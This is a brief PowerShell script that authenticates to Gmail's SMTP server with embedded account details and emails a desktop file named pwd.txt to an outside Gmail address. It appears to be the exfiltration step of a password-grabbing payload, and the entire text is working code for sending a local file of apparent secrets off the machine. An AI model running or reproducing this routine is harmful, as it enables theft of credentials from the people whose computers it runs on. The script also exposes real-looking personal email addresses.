$Message = new-object Net.Mail.MailMessage 
$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587) 
$smtp.Credentials = New-Object System.Net.NetworkCredential("testsubhranshu00@gmail.com", "password"); 
$smtp.EnableSsl = $true   
$Message.From = "testsubhranshu00@gmail.com" 
$Message.To.Add("subhransuchoudhury00@gmail.com") 
$Message.Attachments.Add("C:\Users\Choud\Desktop\pwd.txt")
$smtp.Send($Message)
